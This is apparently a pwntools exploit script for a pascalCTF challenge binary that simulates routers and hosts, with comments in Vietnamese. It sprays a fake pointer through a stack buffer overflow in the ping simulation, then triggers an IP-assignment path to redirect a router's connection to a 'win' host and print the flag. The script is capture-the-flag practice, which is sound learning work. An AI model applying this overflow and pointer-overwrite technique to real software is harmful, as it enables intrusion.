from pwn import *
import os

# =========================================================
# CẤU HÌNH ENVIRONMENT
# =========================================================
exe = './PT2'
context.binary = exe

context.log_level = 'debug'  # Thay 'debug' nếu cần nhiều thông tin hơn

# Đường dẫn tới thư mục chứa file libc.so.6 và ld...
# Bạn đang ở đúng thư mục đó rồi.
cwd = os.getcwd()

# Thiết lập môi trường để dùng đúng Libc của đề
# Điều này cực kỳ quan trọng cho Stack Offset!
env_vars = {
    'LD_LIBRARY_PATH': cwd,
    'FLAG': 'pascalCTF{test_flag_is_here}'
}

# Nếu bạn chạy local mà bị lỗi loader, hãy thử bỏ dòng LD_PRELOAD
# và chỉ giữ FLAG. Nhưng tốt nhất là nên dùng đúng môi trường.
p = process(exe, env=env_vars, stderr=subprocess.STDOUT)

# =========================================================
# OFFSET & ADDRESS
# =========================================================
# Heap Base (0x555555560000)
heap_base = 0x555555560000 
win_host_addr = heap_base + 0x3c0
r0_iface_addr = heap_base + 0x5b0

# Target: Ghi đè r0->connected_to
fake_ip_iface = r0_iface_addr - 0x78

# Offset Stack: Thử 280 (Nếu fail, thử 264 hoặc 296)
STACK_OFFSET = 280

log.info(f"Target WinHost: {hex(win_host_addr)}")
log.info(f"Fake Pointer:   {hex(fake_ip_iface)}")

# =========================================================
# EXPLOIT
# =========================================================

def create_router(idx, name):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'choice: ', b'7') 
    p.sendlineafter(b'index: ', str(idx).encode())

def create_host(idx, name):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'name: ', name)

def int_to_ip(val):
    return f"{val & 0xff} {(val >> 8) & 0xff} {(val >> 16) & 0xff} {(val >> 24) & 0xff}".encode()

log.info("--- SETUP ---")
create_router(0, b'R0')
create_host(0, b'H0') 

log.info("--- ATTACK ---")
# 1. Stack Overflow
p.sendlineafter(b'choice: ', b'16') # Sim
p.sendlineafter(b'choice: ', b'1')  # Ping
p.sendlineafter(b'Index: ', b'0')
p.sendlineafter(b': ', b'1 1 1 1') 

# Payload: Lấp đầy buffer 1024 bytes
# Kỹ thuật Spray: Lặp lại pointer nhiều lần để tăng xác suất trúng
payload = p64(fake_ip_iface) * (1024 // 8)
p.sendlineafter(b': ', payload)
p.sendlineafter(b'choice: ', b'3') # Exit Sim

# 2. Trigger Logic
p.sendlineafter(b'choice: ', b'12') # Assign IP
p.sendlineafter(b'[2]: ', b'2')     # Host
p.sendlineafter(b'index: ', b'29')  # Trigger

# Gửi IP/Netmask dồn dập
# Nếu exploit thành công, nó sẽ ăn dòng này làm IP
# Nếu thất bại, nó sẽ ăn dòng này làm Menu Choice (và có thể exit)
low_4 = win_host_addr & 0xffffffff
high_4 = (win_host_addr >> 32) & 0xffffffff

p.sendline(int_to_ip(low_4))
p.sendline(int_to_ip(high_4))

log.info("Payload sent. Flushing output...")

# 3. Đọc Flag
try:
    # Đọc liên tục cho đến khi EOF
    output = p.recvall(timeout=5).decode(errors='ignore')
    
    if "pascalCTF" in output:
        log.success("\n" + "="*20 + "\nFLAG FOUND: " + re.search(r'pascalCTF\{.*?\}', output).group(0) + "\n" + "="*20)
    else:
        log.failure("Flag not found. Raw output check:\n" + output[-500:])
except Exception as e:
    log.error(str(e))